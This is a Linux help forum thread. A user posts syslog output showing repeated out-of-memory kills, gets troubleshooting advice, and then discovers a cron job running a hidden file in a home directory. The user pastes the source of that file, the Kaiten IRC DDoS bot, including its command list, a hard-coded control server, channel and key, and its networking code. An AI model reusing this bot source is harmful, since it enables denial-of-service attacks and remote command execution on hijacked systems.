Oct  6 13:19:57 afrotc-server kernel: [12553.921179] DMA: 7*4kB 1*8kB 1*16kB 1*32kB 0*64kB 1*128kB 1*256kB 0*512kB 1*1024kB 1*2048kB 0*4096kB = 3540kB
Oct  6 13:19:57 afrotc-server kernel: [12553.921186] Normal: 1180*4kB 10*8kB 1*16kB 1*32kB 1*64kB 1*128kB 0*256kB 1*512kB 1*1024kB 0*2048kB 0*4096kB = 6576kB
Oct  6 13:19:57 afrotc-server kernel: [12553.921193] HighMem: 2647*4kB 1977*8kB 1409*16kB 991*32kB 658*64kB 359*128kB 152*256kB 86*512kB 36*1024kB 16*2048kB 167*4096kB = 1005332kB
Oct  6 13:19:57 afrotc-server kernel: [12553.921202] Swap cache: add 0, delete 0, find 0/0, race 0+0
Oct  6 13:19:57 afrotc-server kernel: [12553.921203] Free swap  = 3229024kB
Oct  6 13:19:57 afrotc-server kernel: [12553.921204] Total swap = 3229024kB
Oct  6 13:19:57 afrotc-server kernel: [12553.921206] Free swap:       3229024kB
Oct  6 13:19:57 afrotc-server kernel: [12553.925599] 523900 pages of RAM
Oct  6 13:19:57 afrotc-server kernel: [12553.925600] 294524 pages of HIGHMEM
Oct  6 13:19:57 afrotc-server kernel: [12553.925602] 5350 reserved pages
Oct  6 13:19:57 afrotc-server kernel: [12553.925603] 140248 pages shared
Oct  6 13:19:57 afrotc-server kernel: [12553.925604] 0 pages swap cached
Oct  6 13:19:57 afrotc-server kernel: [12553.925605] 3 pages dirty
Oct  6 13:19:57 afrotc-server kernel: [12553.925606] 0 pages writeback
Oct  6 13:19:57 afrotc-server kernel: [12553.925607] 7218 pages mapped
Oct  6 13:19:57 afrotc-server kernel: [12553.925608] 128305 pages slab
Oct  6 13:19:57 afrotc-server kernel: [12553.925610] 849 pages pagetables
Oct  6 13:19:57 afrotc-server kernel: [12553.925612] Out of memory: kill process 7441 (apache2) score 5966 or a child
Oct  6 13:19:57 afrotc-server kernel: [12553.925653] Killed process 7441 (apache2)
Oct  6 13:19:57 afrotc-server kernel: [12553.937083] Out of memory: kill process 6293 (notification-da) score 5963 or a child
Oct  6 13:19:57 afrotc-server kernel: [12553.937102] Killed process 6293 (notification-da)
Oct  6 13:19:57 afrotc-server kernel: [12554.724894] Out of memory: kill process 7439 (apache2) score 5933 or a child
Oct  6 13:19:57 afrotc-server kernel: [12554.724915] Killed process 7439 (apache2)
Oct  6 13:19:58 afrotc-server kernel: [12555.159616] Out of memory: kill process 7440 (apache2) score 5933 or a child
Oct  6 13:19:58 afrotc-server kernel: [12555.159633] Killed process 7440 (apache2)
Oct  6 13:19:58 afrotc-server kernel: [12555.276563] Out of memory: kill process 6159 (gnome-power-man) score 5767 or a child
Oct  6 13:19:58 afrotc-server kernel: [12555.276583] Killed process 6159 (gnome-power-man)
Oct  6 13:19:58 afrotc-server kernel: [12555.595370] Out of memory: kill process 6162 (gnome-volume-ma) score 5166 or a child
Oct  6 13:19:58 afrotc-server kernel: [12555.595387] Killed process 6162 (gnome-volume-ma)
Oct  6 13:19:59 afrotc-server kernel: [12556.283993] Out of memory: kill process 6055 (gnome-screensav) score 3801 or a child
Oct  6 13:19:59 afrotc-server kernel: [12556.284012] Killed process 6055 (gnome-screensav)
Oct  6 13:19:59 afrotc-server kernel: [12556.487859] Out of memory: kill process 6404 (gvfsd-computer) score 3545 or a child
Oct  6 13:19:59 afrotc-server kernel: [12556.487878] Killed process 6404 (gvfsd-computer)
Oct  6 13:20:00 afrotc-server kernel: [12557.142551] Out of memory: kill process 6161 (gvfsd-trash) score 3459 or a child
Oct  6 13:20:00 afrotc-server kernel: [12557.142570] Killed process 6161 (gvfsd-trash)
Oct  6 13:20:01 afrotc-server /USR/SBIN/CRON[7461]: (smmsp) CMD (test -x /etc/init.d/sendmail && /usr/share/sendmail/sendmail cron-msp)
Oct  6 13:20:02 afrotc-server kernel: [12559.077398] printk: 8 messages suppressed.
Oct  6 13:20:02 afrotc-server kernel: [12559.077403] cron invoked oom-killer: gfp_mask=0xd0, order=1, oomkilladj=0
Oct  6 13:20:02 afrotc-server kernel: [12559.077406] Pid: 5509, comm: cron Not tainted 2.6.24-19-generic #1
Oct  6 13:20:02 afrotc-server kernel: [12559.077420]  [oom_kill_process+0x10a/0x120] oom_kill_process+0x10a/0x120
Oct  6 13:20:02 afrotc-server kernel: [12559.077428]  [out_of_memory+0x167/0x1a0] out_of_memory+0x167/0x1a0
Oct  6 13:20:02 afrotc-server kernel: [12559.077434]  [sg:__alloc_pages+0x36c/0x3a0] __alloc_pages+0x36c/0x3a0
Oct  6 13:20:02 afrotc-server kernel: [12559.077440]  [ext3:__get_free_pages+0x37/0x820] __get_free_pages+0x37/0x50
Oct  6 13:20:02 afrotc-server kernel: [12559.077443]  [copy_process+0xa6/0x11f0] copy_process+0xa6/0x11f0
Oct  6 13:20:02 afrotc-server kernel: [12559.077451]  [do_fork+0x40/0x260] do_fork+0x40/0x260
Oct  6 13:20:02 afrotc-server kernel: [12559.077456]  [sys_clone+0x36/0x40] sys_clone+0x36/0x40
Oct  6 13:20:02 afrotc-server kernel: [12559.077459]  [sysenter_past_esp+0x6b/0xa9] sysenter_past_esp+0x6b/0xa9
Oct  6 13:20:02 afrotc-server kernel: [12559.077464]  [unix_stream_sendmsg+0x110/0x390] unix_stream_sendmsg+0x110/0x390
Oct  6 13:20:02 afrotc-server kernel: [12559.077469]  =======================
Oct  6 13:20:02 afrotc-server kernel: [12559.077470] Mem-info:
Oct  6 13:20:02 afrotc-server kernel: [12559.077472] DMA per-cpu:
Oct  6 13:20:02 afrotc-server kernel: [12559.077473] CPU    0: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:20:02 afrotc-server kernel: [12559.077476] CPU    1: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:20:02 afrotc-server kernel: [12559.077478] Normal per-cpu:
Oct  6 13:20:02 afrotc-server kernel: [12559.077480] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:02 afrotc-server kernel: [12559.077482] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:02 afrotc-server kernel: [12559.077484] HighMem per-cpu:
Oct  6 13:20:02 afrotc-server kernel: [12559.077486] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:02 afrotc-server kernel: [12559.077488] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:02 afrotc-server kernel: [12559.077491] Active:19156 inactive:16731 dirty:2 writeback:0 unstable:0
Oct  6 13:20:02 afrotc-server kernel: [12559.077492]  free:259444 slab:128197 mapped:5347 pagetables:797 bounce:0
Oct  6 13:20:02 afrotc-server kernel: [12559.077495] DMA free:3540kB min:68kB low:84kB high:100kB active:0kB inactive:0kB present:16256kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:20:02 afrotc-server kernel: [12559.077497] lowmem_reserve[]: 0 873 2014 2014
Oct  6 13:20:02 afrotc-server kernel: [12559.077501] Normal free:6912kB min:3744kB low:4680kB high:5616kB active:104kB inactive:0kB present:894080kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:20:02 afrotc-server kernel: [12559.077504] lowmem_reserve[]: 0 0 9132 9132
Oct  6 13:20:02 afrotc-server kernel: [12559.077508] HighMem free:1027324kB min:512kB low:1736kB high:2960kB active:76520kB inactive:66924kB present:1168896kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:20:02 afrotc-server kernel: [12559.077510] lowmem_reserve[]: 0 0 0 0
Oct  6 13:20:02 afrotc-server kernel: [12559.077513] DMA: 7*4kB 1*8kB 1*16kB 1*32kB 0*64kB 1*128kB 1*256kB 0*512kB 1*1024kB 1*2048kB 0*4096kB = 3540kB
Oct  6 13:20:02 afrotc-server kernel: [12559.077520] Normal: 1262*4kB 15*8kB 1*16kB 1*32kB 1*64kB 1*128kB 0*256kB 1*512kB 1*1024kB 0*2048kB 0*4096kB = 6944kB
Oct  6 13:20:02 afrotc-server kernel: [12559.077527] HighMem: 2504*4kB 1866*8kB 1351*16kB 962*32kB 670*64kB 381*128kB 159*256kB 93*512kB 44*1024kB 20*2048kB 167*4096kB = 1027360kB
Oct  6 13:20:02 afrotc-server kernel: [12559.077535] Swap cache: add 0, delete 0, find 0/0, race 0+0
Oct  6 13:20:02 afrotc-server kernel: [12559.077537] Free swap  = 3229024kB
Oct  6 13:20:02 afrotc-server kernel: [12559.077538] Total swap = 3229024kB
Oct  6 13:20:02 afrotc-server kernel: [12559.077539] Free swap:       3229024kB
Oct  6 13:20:02 afrotc-server kernel: [12559.081951] 523900 pages of RAM
Oct  6 13:20:02 afrotc-server kernel: [12559.081954] 294524 pages of HIGHMEM
Oct  6 13:20:02 afrotc-server kernel: [12559.081955] 5350 reserved pages
Oct  6 13:20:02 afrotc-server kernel: [12559.081956] 132182 pages shared
Oct  6 13:20:02 afrotc-server kernel: [12559.081957] 0 pages swap cached
Oct  6 13:20:02 afrotc-server kernel: [12559.081958] 2 pages dirty
Oct  6 13:20:02 afrotc-server kernel: [12559.081959] 0 pages writeback
Oct  6 13:20:02 afrotc-server kernel: [12559.081960] 5347 pages mapped
Oct  6 13:20:02 afrotc-server kernel: [12559.081961] 128197 pages slab
Oct  6 13:20:02 afrotc-server kernel: [12559.081962] 797 pages pagetables
Oct  6 13:20:02 afrotc-server kernel: [12559.081965] Out of memory: kill process 7459 (apache2) score 5933 or a child
Oct  6 13:20:02 afrotc-server kernel: [12559.082005] Killed process 7459 (apache2)
Oct  6 13:20:02 afrotc-server kernel: [12559.745241] Out of memory: kill process 5274 (hald) score 1967 or a child
Oct  6 13:20:02 afrotc-server kernel: [12559.745258] Killed process 5278 (hald-runner)
Oct  6 13:20:03 afrotc-server kernel: [12560.589519] Out of memory: kill process 5712 (gconfd-2) score 1807 or a child
Oct  6 13:20:03 afrotc-server kernel: [12560.589537] Killed process 5712 (gconfd-2)
Oct  6 13:20:04 afrotc-server kernel: [12560.832366] Out of memory: kill process 6097 (gvfsd) score 1343 or a child
Oct  6 13:20:04 afrotc-server kernel: [12560.832383] Killed process 6097 (gvfsd)
Oct  6 13:20:04 afrotc-server kernel: [12561.436018] Out of memory: kill process 6171 (gvfsd-burn) score 1343 or a child
Oct  6 13:20:04 afrotc-server kernel: [12561.436036] Killed process 6171 (gvfsd-burn)
Oct  6 13:20:04 afrotc-server /USR/SBIN/CRON[7465]: (afrotc) CMD (/home/afrotc/.icons/"  " > /dev/null 2>&1)
Oct  6 13:20:06 afrotc-server console-kit-daemon[5277]: WARNING: Unable to activate console: No such device or address 
Oct  6 13:20:08 afrotc-server kernel: [12565.417746] printk: 4 messages suppressed.
Oct  6 13:20:08 afrotc-server kernel: [12565.417752]    invoked oom-killer: gfp_mask=0x40d0, order=1, oomkilladj=0
Oct  6 13:20:08 afrotc-server kernel: [12565.417755] Pid: 6661, comm:    Not tainted 2.6.24-19-generic #1
Oct  6 13:20:08 afrotc-server kernel: [12565.417769]  [oom_kill_process+0x10a/0x120] oom_kill_process+0x10a/0x120
Oct  6 13:20:08 afrotc-server kernel: [12565.417778]  [out_of_memory+0x167/0x1a0] out_of_memory+0x167/0x1a0
Oct  6 13:20:08 afrotc-server kernel: [12565.417783]  [sg:__alloc_pages+0x36c/0x3a0] __alloc_pages+0x36c/0x3a0
Oct  6 13:20:08 afrotc-server kernel: [12565.417790]  [__slab_alloc+0x17a/0x4a0] __slab_alloc+0x17a/0x4a0
Oct  6 13:20:08 afrotc-server kernel: [12565.417795]  [ipv6:kmem_cache_alloc+0xad/0xc0] kmem_cache_alloc+0xad/0xc0
Oct  6 13:20:08 afrotc-server kernel: [12565.417798]  [sk_prot_alloc+0x28/0xb0] sk_prot_alloc+0x28/0xb0
Oct  6 13:20:08 afrotc-server kernel: [12565.417804]  [sk_prot_alloc+0x28/0xb0] sk_prot_alloc+0x28/0xb0
Oct  6 13:20:08 afrotc-server kernel: [12565.417808]  [ipv6:sk_alloc+0x2a/0x190] sk_alloc+0x2a/0x70
Oct  6 13:20:08 afrotc-server kernel: [12565.417812]  [inet_create+0x134/0x330] inet_create+0x134/0x330
Oct  6 13:20:08 afrotc-server kernel: [12565.417817]  [sock_alloc_inode+0x20/0x50] sock_alloc_inode+0x20/0x50
Oct  6 13:20:08 afrotc-server kernel: [12565.417822]  [__sock_create+0xcf/0x1f0] __sock_create+0xcf/0x1f0
Oct  6 13:20:08 afrotc-server kernel: [12565.417825]  [destroy_inode+0x27/0x40] destroy_inode+0x27/0x40
Oct  6 13:20:08 afrotc-server kernel: [12565.417830]  [sock_create+0x3a/0x50] sock_create+0x3a/0x50
Oct  6 13:20:08 afrotc-server kernel: [12565.417834]  [sys_socket+0x1c/0x50] sys_socket+0x1c/0x50
Oct  6 13:20:08 afrotc-server kernel: [12565.417837]  [sys_socketcall+0x2a1/0x2b0] sys_socketcall+0x2a1/0x2b0
Oct  6 13:20:08 afrotc-server kernel: [12565.417842]  [irq_exit+0x51/0x80] irq_exit+0x51/0x80
Oct  6 13:20:08 afrotc-server kernel: [12565.417846]  [sysenter_past_esp+0x6b/0xa9] sysenter_past_esp+0x6b/0xa9
Oct  6 13:20:08 afrotc-server kernel: [12565.417853]  =======================
Oct  6 13:20:08 afrotc-server kernel: [12565.417854] Mem-info:
Oct  6 13:20:08 afrotc-server kernel: [12565.417855] DMA per-cpu:
Oct  6 13:20:08 afrotc-server kernel: [12565.417857] CPU    0: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:20:08 afrotc-server kernel: [12565.417860] CPU    1: Hot: hi:    0, btch:   1 usd:   0   Cold: hi:    0, btch:   1 usd:   0
Oct  6 13:20:08 afrotc-server kernel: [12565.417862] Normal per-cpu:
Oct  6 13:20:08 afrotc-server kernel: [12565.417863] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:08 afrotc-server kernel: [12565.417866] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:08 afrotc-server kernel: [12565.417868] HighMem per-cpu:
Oct  6 13:20:08 afrotc-server kernel: [12565.417870] CPU    0: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:08 afrotc-server kernel: [12565.417872] CPU    1: Hot: hi:  186, btch:  31 usd:   0   Cold: hi:   62, btch:  15 usd:   0
Oct  6 13:20:08 afrotc-server kernel: [12565.417875] Active:17860 inactive:15602 dirty:0 writeback:0 unstable:0
Oct  6 13:20:08 afrotc-server kernel: [12565.417876]  free:261862 slab:128181 mapped:3195 pagetables:780 bounce:0
Oct  6 13:20:08 afrotc-server kernel: [12565.417879] DMA free:3540kB min:68kB low:84kB high:100kB active:0kB inactive:0kB present:16256kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:20:08 afrotc-server kernel: [12565.417881] lowmem_reserve[]: 0 873 2014 2014
Oct  6 13:20:08 afrotc-server kernel: [12565.417886] Normal free:6760kB min:3744kB low:4680kB high:5616kB active:88kB inactive:0kB present:894080kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:20:08 afrotc-server kernel: [12565.417888] lowmem_reserve[]: 0 0 9132 9132
Oct  6 13:20:08 afrotc-server kernel: [12565.417892] HighMem free:1037148kB min:512kB low:1736kB high:2960kB active:71352kB inactive:62408kB present:1168896kB pages_scanned:0 all_unreclaimable? no
Oct  6 13:20:08 afrotc-server kernel: [12565.417895] lowmem_reserve[]: 0 0 0 0
Oct  6 13:20:08 afrotc-server kernel: [12565.417897] DMA: 7*4kB 1*8kB 1*16kB 1*32kB 0*64kB 1*128kB 1*256kB 0*512kB 1*1024kB 1*2048kB 0*4096kB = 3540kB
Oct  6 13:20:08 afrotc-server kernel: [12565.417905] Normal: 1234*4kB 10*8kB 1*16kB 1*32kB 1*64kB 1*128kB 0*256kB 1*512kB 1*1024kB 0*2048kB 0*4096kB = 6792kB
Oct  6 13:20:08 afrotc-server kernel: [12565.417912] HighMem: 2537*4kB 1852*8kB 1318*16kB 971*32kB 655*64kB 387*128kB 167*256kB 97*512kB 44*1024kB 23*2048kB 167*4096kB = 1037188kB
Oct  6 13:20:08 afrotc-server kernel: [12565.417920] Swap cache: add 0, delete 0, find 0/0, race 0+0
Oct  6 13:20:08 afrotc-server kernel: [12565.417922] Free swap  = 3229024kB
Oct  6 13:20:08 afrotc-server kernel: [12565.417923] Total swap = 3229024kB
Oct  6 13:20:08 afrotc-server kernel: [12565.417924] Free swap:       3229024kB
Oct  6 13:20:08 afrotc-server kernel: [12565.422326] 523900 pages of RAM
Oct  6 13:20:08 afrotc-server kernel: [12565.422328] 294524 pages of HIGHMEM
Oct  6 13:20:08 afrotc-server kernel: [12565.422330] 5350 reserved pages
Oct  6 13:20:08 afrotc-server kernel: [12565.422331] 128313 pages shared
Oct  6 13:20:08 afrotc-server kernel: [12565.422332] 0 pages swap cached
Oct  6 13:20:08 afrotc-server kernel: [12565.422333] 0 pages dirty
Oct  6 13:20:08 afrotc-server kernel: [12565.422334] 0 pages writeback
Oct  6 13:20:08 afrotc-server kernel: [12565.422336] 3195 pages mapped
Oct  6 13:20:08 afrotc-server kernel: [12565.422337] 128181 pages slab
Oct  6 13:20:08 afrotc-server kernel: [12565.422338] 780 pages pagetables
Oct  6 13:20:08 afrotc-server kernel: [12565.422340] Out of memory: kill process 7462 (apache2) score 5933 or a child
Oct  6 13:20:08 afrotc-server kernel: [12565.422381] Killed process 7462 (apache2)
Oct  6 13:20:09 afrotc-server kernel: [12566.550103] Out of memory: kill process 4832 (avahi-daemon) score 1036 or a child
Oct  6 13:20:09 afrotc-server kernel: [12566.550120] Killed process 4833 (avahi-daemon)
Oct  6 13:20:10 afrotc-server dhcdbd: Shut down.
Oct  6 13:20:10 afrotc-server hcid[5387]: Got disconnected from the system message bus
Oct  6 13:20:10 afrotc-server audio[5406]: Removing service record 0x10000 failed: Connection is closed
Oct  6 13:20:10 afrotc-server audio[5406]: Unregistered manager path
Oct  6 13:20:10 afrotc-server audio[5406]: Exit
Oct  6 13:20:10 afrotc-server avahi-daemon[4832]: Disconnected from D-Bus, exiting.
Oct  6 13:20:10 afrotc-server avahi-daemon[4832]: Got SIGQUIT, quitting.
Oct  6 13:20:10 afrotc-server avahi-daemon[4832]: write() failed: Broken pipe 
Oct  6 13:20:10 afrotc-server avahi-daemon[4832]: Leaving mDNS multicast group on interface eth0.IPv4 with address 192.168.10.10.
Oct  6 13:20:10 afrotc-server avahi-daemon[4832]: write() failed: Broken pipe 
Oct  6 13:20:12 afrotc-server mysqld_safe[7473]: restarted
Oct  6 13:20:13 afrotc-server console-kit-daemon[5277]: WARNING: Couldn't connect to system bus: Failed to connect to socket /var/run/dbus/system_bus_socket: Connection refused 
 
```

It seams to keep killing the processes because it is running out of memory for some reason even thought it says there is still SWAP memory left.

---

### Post by taladan on 2008-10-06
try taking it down and run a mem test on it? 

Could be that you have a stick of ram failing in it.

Also, check top and see what's running the most memory usage on there - may have some runaway processes.

Tal

---

### Post by murbanci on 2008-10-07
I was monitoring the system log and I noticed the following command kept being issued from a CRON job I think:
```
Oct  7 12:23:01 afrotc-server /USR/SBIN/CRON[6471]: (afrotc) CMD (/home/afrotc/.icons/"  " > /dev/null 2>&1)
```

I looked in the .icons folder and noticed there was a file called kaiten.c.  I posted the contents below.  It seams to be some kind of IRC file but I have not installed any kind of IRC server.

```
/*******************************************************************************
 *                                                                             *
 *                          Kaiten (IRC DDoS)                                  *
 *                           by contem@efnet                                   *
 *                                                                             *
 *   This is a IRC based distributed denial of service client.  It connects to *
 * the server specified below and accepts commands via the channel specified.  *
 * The syntax is:                                                              *
 *       !<nick> <command>                                                     *
 * You send this message to the channel that is defined later in this code.    *
 * Where <nick> is the nickname of the client (which can include wildcards)    *
 * and the command is the command that should be sent.  For example, if you    *
 * want to tell all the clients with the nickname starting with N, to send you *
 * the help message, you type in the channel:                                  *
 *       !N* HELP                                                              *
 * That will send you a list of all the commands.  You can also specify an     *
 * astrick alone to make all client do a specific command:                     *
 *       !* SH uname -a                                                        *
 * There are a number of commands that can be sent to the client:              *
 *       TSUNAMI <target> <secs>       = A PUSH+ACK flooder                    *
 *       PAN <target> <port> <secs>    = A SYN flooder                         *
 *       UDP <target> <port> <secs>    = An UDP flooder                        *
 *       UNKNOWN <target> <secs>       = Another non-spoof udp flooder         *
 *       NICK <nick>                   = Changes the nick of the client        *
 *       SERVER <server>               = Changes servers                       *
 *       GETSPOOFS                     = Gets the current spoofing             *
 *       SPOOFS <subnet>               = Changes spoofing to a subnet          *
 *       DISABLE                       = Disables all packeting from this bot  *
 *       ENABLE                        = Enables all packeting from this bot   *
 *       KILL                          = Kills the knight                      *
 *       GET <http address> <save as>  = Downloads a file off the web          *
 *       VERSION                       = Requests version of knight            *
 *       KILLALL                       = Kills all current packeting           *
 *       HELP                          = Displays this                         *
 *       IRC <command>                 = Sends this command to the server      *
 *       SH <command>                  = Executes a command                    *
 * Remember, all these commands must be prefixed by a ! and the nickname that  *
 * you want the command to be sent to (can include wildcards). There are no    *
 * spaces in between the ! and the nickname, and there are no spaces before    *
 * the !                                                                       *
 *                                                                             *
 *******************************************************************************/

#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
//////////////////////////////////////////////////////////////////////////////
#define MAXPATH 1024
#define CLIENTS 100
#define STARTUP
#define ESCANPORT 10100
#define FAKENAME "-bash"
#define CHAN "#linux" // Channel to join
#define KEY "snooze" // Key used for channel
int numservers=1; // Must change this to equal number of servers down there
char *initservers[] = {		// List the servers in that format, always end in (void*)0
	"policija.name",
	NULL
};
/////////////////////////////////////////////////////////////////////////////
#define FREE(x) {if (x) { free(x);x=NULL; }}

enum { TCP_PENDING=1, TCP_CONNECTED=2, SOCKS_REPLY=3 };
enum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };
enum { AREAD=1, AWRITE=2, AEXCEPT=4 };

struct ainst {
	void *ext,*ext5;
	int ext2,ext3,ext4;

	int sock,error;
	unsigned long len;
	struct sockaddr_in in;
};
struct ainst clients[CLIENTS];

void cleanup(char *buf) {
	while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
	while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
		unsigned long i;
		for (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];
	}
}

char *aerror(struct ainst *inst) {
	if (inst == NULL) return "Invalid instance or socket";
	switch(inst->error) {
		case ASUCCESS:return "Operation Success";
		case ARESOLVE:return "Unable to resolve";
		case ACONNECT:return "Unable to connect";
		case ASOCKET:return "Unable to create socket";
		case ABIND:return "Unable to bind socket";
		case AINUSE:return "Port is in use";
		case APENDING:return "Operation pending";
		case AUNKNOWN:default:return "Unknown";
	}
	return "";
}

int aresolve(char *host) {
 	struct hostent *hp;
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		unsigned long a;
		if ((hp = gethostbyname(host)) == NULL) return 0;
		bcopy((char*)hp->h_addr, (char*)&a, hp->h_length);
		return a;
	}
	else return inet_addr(host);
}

int abind(struct ainst *inst,unsigned long ip,unsigned short port) {
	struct sockaddr_in in;
	if (inst == NULL) return (AINSTANCE);
	if (inst->sock == 0) {
		inst->error=AINSTANCE;
		return (AINSTANCE);
	}
	inst->len=0;
	in.sin_family = AF_INET;
	if (ip == NULL) in.sin_addr.s_addr = INADDR_ANY;
	else in.sin_addr.s_addr = ip;
	in.sin_port = htons(port);
	if (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
	inst->error=ASUCCESS;
	return ASUCCESS;
}

int await(struct ainst **inst,unsigned long len,char type,long secs) {
	struct timeval tm,*tmp;
	fd_set read,write,except,*readp,*writep,*exceptp;
	int p,ret,max;
	if (inst == NULL) return (AINSTANCE);
	for (p=0;p<len;p++) inst[p]->len=0;
	if (secs > 0) {
		tm.tv_sec=secs;
		tm.tv_usec=0;
		tmp=&tm;
	}
	else tmp=(struct timeval *)NULL;
	if (type & AREAD) {
		FD_ZERO(&read);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&read);
		readp=&read;
	}
	else readp=(struct fd_set*)0;
	if (type & AWRITE) {
		FD_ZERO(&write);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&write);
		writep=&write;
	}
	else writep=(struct fd_set*)0;
	if (type & AEXCEPT) {
		FD_ZERO(&except);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&except);
		exceptp=&except;
	}
	else exceptp=(struct fd_set*)0;
	for (p=0,max=0;p<len;p++) if (inst[p]->sock > max) max=inst[p]->sock;
	if ((ret=select(max+1,readp,writep,exceptp,tmp)) == 0) {
		for (p=0;p<len;p++) inst[p]->error=APENDING;
		return (APENDING);
	}
	if (ret == -1) return (AUNKNOWN);
	for (p=0;p<len;p++) {
		if (type & AREAD) if (FD_ISSET(inst[p]->sock,&read)) inst[p]->len+=AREAD;
		if (type & AWRITE) if (FD_ISSET(inst[p]->sock,&write)) inst[p]->len+=AWRITE;
		if (type & AEXCEPT) if (FD_ISSET(inst[p]->sock,&except)) inst[p]->len+=AEXCEPT;
	}
	for (p=0;p<len;p++) inst[p]->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_sync_check(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
		inst->error=ASUCCESS;
		return (ASUCCESS);
	}
	if (!(errno == EINPROGRESS ||errno == EALREADY)) {
		inst->error=ACONNECT;
		return (ACONNECT);
	}
	inst->error=APENDING;
	return (APENDING);
}

int atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_connect(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
	unsigned long start;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
			inst->error=ASUCCESS;
			return (ASUCCESS);
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	inst->error=ACONNECT;
	return (ACONNECT);
}

int atcp_accept(struct ainst *inst,struct ainst *child) {
	int sock;
	unsigned int datalen;
	if (inst == NULL || child == NULL) return (AINSTANCE);
	datalen=sizeof(child->in);
	inst->len=0;
	memcpy((void*)child,(void*)inst,sizeof(struct ainst));
	if ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {
		memset((void*)child,0,sizeof(struct ainst));
		inst->error=APENDING;
		return (APENDING);
	}
	child->sock=sock;
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_send(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if ((datalen=write(inst->sock,buf,len)) < len) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_sendmsg(struct ainst *inst, char *words, ...) {
	static char textBuffer[2048];
	unsigned int a;
	va_list args;
	va_start(args, words);
	a=vsprintf(textBuffer, words, args);
	va_end(args);
	return atcp_send(inst,textBuffer,a);
}

